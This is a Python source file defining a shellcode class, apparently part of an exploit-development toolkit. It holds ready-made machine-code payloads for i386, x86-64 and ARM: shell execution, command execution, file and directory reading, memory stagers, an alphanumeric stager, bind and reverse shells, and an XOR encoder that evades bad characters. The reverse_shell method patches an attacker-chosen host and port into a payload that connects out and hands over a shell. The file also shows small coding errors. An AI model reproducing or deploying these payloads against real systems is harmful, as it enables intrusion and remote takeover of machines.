#!/usr/bin/python3

import socket
import struct
from ..misc.utils import *
# Retrieve shellcode

class shellcode(object):
    _database = {
        'i386': {
            'noppairs': ['AI', 'BJ', 'CK', 'FN', 'GO'],
            'exec_shell': '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80',
            'exec_command': '\xeb\x29\x5e\x31\xc9\x8a\x0e\x46\x88\x2c\x0e\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x51\x53\x89\xe1\xcd\x80\xe8\xd2\xff\xff\xff',
            'dup': '\x31\xd2\x8d\x5a${fd}\x8d\x4a\x02\x8d\x42\x3f\xcd\x80\x49\x7d\xf8',
            'readfile': '\xeb\x2d\x5b\x31\xc9\x8a\x0b\x43\x88\x2c\x0b\x31\xc9\x8d\x41\x05\xcd\x80\x93\x91\x8d\x50\x01\xc1\xe2\x0c\x6a\x03\x58\xcd\x80\x92\x6a${fd}\x5b\x6a\x04\x58\xcd\x80\x31\xdb\x8d\x43\x01\xcd\x80\xe8\xce\xff\xff\xff',
            'readdir': '\xeb\x41\x5b\x31\xc9\x8a\x0b\x43\x88\x2c\x0b\x31\xff\x31\xc9\x8d\x47\x05\xcd\x80\x93\x91\x8d\x57\x01\x8d\x47\x59\x60\xcd\x80\x87\xce\x85\xc0\x74\x17\x66\x8b\x56\x08\x8d\x4e\x0a\xc6\x04\x11\x0a\x42\x8d\x5f${fd}\x8d\x47\x04\xcd\x80\x61\xeb\xe0\x31\xdb\x8d\x47\x01\xcd\x80\xe8\xba\xff\xff\xff',
            'read_stager': '\xeb\x0f\x59\x6a\x03\x58\x99\x89\xd3\x42\xc1\xe2\x0c\xcd\x80\xff\xe1\xe8\xec\xff\xff\xff',
            'mmap_stager': '\x6a\x5a\x58\x99\x89\xd1\x42\xc1\xe2\x0c\x51\x6a\xff\x6a\x22\x6a\x07\x52\x51\x89\xe3\xcd\x80\x91\x93\x8d\x43\x03\xcd\x80\xff\xe1',
            'alnum_stager': 'Yh3333k4dsFkDqG02DqH0D10u03P3H1o0j2B0207393s3q103a8P7l3j4s3B065k3O4N8N8O03',
            'bind_shell': '\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x66\x68${port}\x66\x6a\x02\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80',
            'reverse_shell': '\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68${host}\x66\x68${port}\x66\x6a\x02\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80',
            'xor': '\xeb\x0f\x5e\x80\x36${key}\x74\x0e\x46\xeb\xf8${key}${key}${key}${key}${key}${key}\xe8\xec\xff\xff\xff',
        },
        'x86-64': {
            'noppairs': ['PX', 'QY', 'RZ'],
            'exec_shell': '\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05',
            'exec_command': '\xeb\x31\x5e\x48\x31\xc9\x8a\x0e\x48\xff\xc6\x88\x2c\x0e\x6a\x3b\x58\x48\x99\x52\x66\x68\x2d\x63\x48\x89\xe3\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x56\x53\x57\x48\x89\xe6\x0f\x05\xe8\xca\xff\xff\xff',
            'dup': '\x6a${fd}\x5f\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x7d\xf6',
            'readfile': '\xeb\x33\x5f\x48\x31\xc9\x8a\x0f\x48\xff\xc7\x88\x2c\x0f\x48\x31\xf6\x6a\x02\x58\x0f\x05\x48\x97\x48\x96\x6a\x01\x5a\x48\xc1\xe2\x0c\x0f\x05\x48\x92\x6a${fd}\x5f\x6a\x01\x58\x0f\x05\x48\x31\xff\x6a\x3c\x58\x0f\x05\xe8\xc8\xff\xff\xff',
            'readdir': '\xeb\x57\x5f\x48\x31\xc9\x8a\x0f\x48\xff\xc7\x88\x2c\x0f\x48\x31\xf6\x6a\x02\x58\x0f\x05\x48\x97\x48\x96\x48\x31\xd2\x66\xf7\xd2\x6a\x4e\x58\x0f\x05\x48\x8b\x06\x48\x85\xc0\x74\x24\x66\x8b\x56\x10\x4c\x8d\x04\x16\x48\x83\xea\x14\x48\x8d\x76\x12\xc6\x04\x16\x0a\x48\xff\xc2\x6a${fd}\x5f\x6a\x01\x58\x0f\x05\x4c\x89\xc6\xeb\xd4\x48\x31\xff\x6a\x3c\x58\x0f\x05\xe8\xa4\xff\xff\xff',
            'read_stager': '\xeb\x13\x5e\x48\x31\xff\x48\x8d\x57\x01\x48\xc1\xe2\x0c\x48\x31\xc0\x0f\x05\xff\xe6\xe8\xe8\xff\xff\xff',
            'mmap_stager': '\x4d\x31\xc9\x6a\xff\x41\x58\x6a\x22\x41\x5a\x6a\x07\x5a\x49\x8d\x71\x01\x48\xc1\xe6\x0c\x48\x31\xff\x6a\x09\x58\x0f\x05\x48\x96\x48\x92\x48\x31\xc0\x0f\x05\xff\xe6',
            'alnum_stager': 'h0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M367p0h1O0A8O7p5L2x01193i4m7k08144L7m1M3K043I3A8L4V8K0m',
            'bind_shell': '\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\xba\xf2\xff${port}\x66\x83\xf2\xf0\x52\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05',
            'reverse_shell': '\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x68${host}\x66\x68${port}\x66\x6a\x02\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05',
            'xor': '\xeb\x0f\x5e\x80\x36${key}\x74\x0e\x48\xff\xc6\xeb\xf6${key}${key}${key}${key}\xe8\xec\xff\xff\xff',
        },
        'arm': {
            'exec_shell': '\x01\x70\x8f\xe2\x17\xff\x2f\xe1\x04\xa7\x03\xcf\x52\x40\x07\xb4\x68\x46\x05\xb4\x69\x46\x0b\x27\x01\xdf\xc0\x46\x2f\x62\x69\x6e\x2f\x2f\x73\x68',
        },
    }

    def __init__(self, arch):
        if arch not in self._database:
            raise Exception("unsupported architechture: %r" % arch)
        self.arch = arch

    def get(self, name, **kwargs):
        if name not in self._database[self.arch]:
            raise Exception("unsupported shellcode for %s architecture: %r" % (arch, name))

        sc = self._database[self.arch][name]
        for k, v in kwargs.items():
            sc = sc.replace("${%s}" % k, v)
        return sc

    def nopfill(self, code, size, buf=''):
        noppairs = self.get('noppairs')
        buflen = size - len(buf) - len(code)
        assert buflen >= 0, "%d bytes over" % (-buflen,)
        buf = ''
        while len(buf) < buflen:
            buf += random.choice(noppairs)
        return buf[:buflen] + code

    def exec_shell(self):
        return self.get('exec_shell')

    def exec_command(self, command):
        return self.get('exec_command') + chr(len(command)) + command

    def dup(self, code, fd):
        return self.get('dup', fd=chr(fd)) + code

    def readfile(self, path, fd=1):
        return self.get('readfile', fd=chr(fd)) + chr(len(path)) + path

    def readdir(self, path, fd=1):
        return self.get('readdir', fd=chr(fd)) + chr(len(path)) + path

    def read_stager(self):
        return self.get('read_stager')

    def mmap_stager(self):
        return self.get('mmap_stager')

    def alnum_stager(self, reg):
        if self.arch == 'i386':
            r = ['eax', 'ecx', 'edx', 'ebx', 'esi', 'edi', 'esi', 'edi'].index(reg)
            return chr(0x50+r) + self.get('alnum_stager')
        elif self.arch == 'x86-64':
            r = ['rax', 'rcx', 'rdx', 'rbx', 'rsi', 'rdi', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15'].index(reg)
            if r >= 8:
                return '\x41' + chr(0x50+(r-8)) + self.get('alnum_stager')
            else:
                return chr(0x50+r) + self.get('alnum_stager')
        else:
            raise Exception("unsupported architecture: %r" % self.arch)

    def bind_shell(self, port):
        p = struct.pack('>H', port)
        return self.get('bind_shell', port=p)

    def reverse_shell(self, host, port):
        addrinfo = socket.getaddrinfo(host, port, socket.AF_INET, socket.SOCK_STREAM)
        h, p = addrinfo[0][4]
        h = socket.inet_aton(h)
        p = struct.pack('>H', p)
        return self.get('reverse_shell', host=h, port=p)

    def xor(self, code, badchars='\x00\t\n\v\f\r '):
        for key in range(0x100):
            decoder = self.get('xor', key=chr(key))
            encoded_code = str(bytearray(c^key for c in bytearray(code)))
            result = decoder + encoded_code + chr(key)
            if all(c not in result for c in badchars):
                return result
        else:
            raise Exception('xor key not found')
